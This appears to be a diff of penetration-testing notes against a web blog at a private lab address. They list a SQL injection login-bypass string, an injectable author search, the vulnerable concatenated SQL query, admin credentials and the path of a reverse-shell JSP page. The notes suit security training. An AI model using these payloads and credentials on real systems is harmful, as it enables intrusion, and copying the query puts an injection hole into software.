@@ -1,0 +1,15 @@
+http://10.11.1.222:8080/blog
+
+bypass: a' or 'a'='a
+
+http://10.11.1.222:8080/blog/home.jsp - Author search vulnerable to sql injection
+
+a' or 'a'='a
+
+sql = "select count(user_name) from web_users where user_name='" + username + "' and password='" + userpass + "'";
+
+Ihttp://10.11.1.222:8080/blog/admin.jsp
+user: admin 
+pasword: adminadmin
+
+http://10.11.1.222:8080/blog/reverseshell.jsp
